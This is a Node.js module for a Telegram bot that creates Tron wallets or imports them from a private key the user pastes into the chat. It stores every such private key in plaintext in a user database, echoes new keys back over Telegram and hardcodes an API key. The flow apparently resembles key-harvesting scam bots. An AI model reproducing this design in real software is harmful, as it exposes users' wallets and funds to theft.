const { User } = require("../models/userModel");
const TronWeb = require("tronweb").default.TronWeb;

const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
  headers: { "TRON-PRO-API-KEY": "92471f2b-3108-484b-8ba8-a58402b4f7a3" },
});

module.exports = {
  handleConnectWallet: async (bot, chatId) => {
    return bot.sendMessage(
      chatId,
      "⚙️ Choose how to connect your Tron wallet:",
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🔐 Create New Wallet", callback_data: "create_wallet" },
              {
                text: "🔑 Import with Private Key",
                callback_data: "import_wallet",
              },
            ],
          ],
        },
      }
    );
  },

  handleCreateWallet: async (bot, chatId, userId) => {
    const account = await tronWeb.createAccount();
    const {
      address: { base58 },
      privateKey,
    } = account;

    await User.findOneAndUpdate(
      { telegram_id: userId },
      {
        walletAddress: base58,
        privateKey,
        walletCreated: true,
      }
    );

    await bot.sendMessage(
      chatId,
      `✅ Wallet Created Successfully!\n\n🔐 *Save your private key:*\n\`${privateKey}\``,
      {
        parse_mode: "Markdown",
      }
    );

    return bot.sendMessage(
      chatId,
      "📤 Now click Submit to complete registration.",
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🚀 Submit Response", callback_data: "submit_response" }],
          ],
        },
      }
    );
  },

  handleImportWallet: async (bot, chatId, userId) => {
    await User.findOneAndUpdate(
      { telegram_id: userId },
      { state: "awaiting_private_key" }
    );
    return bot.sendMessage(chatId, "🔑 Please send your TRON private key:");
  },

  handlePrivateKeyInput: async (bot, msg, user) => {
    const privateKey = msg.text;
    const chatId = msg.chat.id;

    try {
      const account = await tronWeb.setPrivateKey(privateKey);
      const walletAddress = await tronWeb.address.fromPrivateKey(privateKey);

      await User.findOneAndUpdate(
        { telegram_id: user.telegram_id },
        {
          walletAddress,
          privateKey,
          state: null,
          walletCreated: true,
        }
      );

      await bot.sendMessage(
        chatId,
        `✅ Wallet Imported Successfully!\nAddress: \`${walletAddress}\``,
        {
          parse_mode: "Markdown",
        }
      );

      return bot.sendMessage(
        chatId,
        "📤 Now click Submit to complete registration.",
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "🚀 Submit Response",
                  callback_data: "submit_response",
                },
              ],
            ],
          },
        }
      );
    } catch (error) {
      return bot.sendMessage(
        chatId,
        "❌ Invalid private key. Please try again."
      );
    }
  },
};
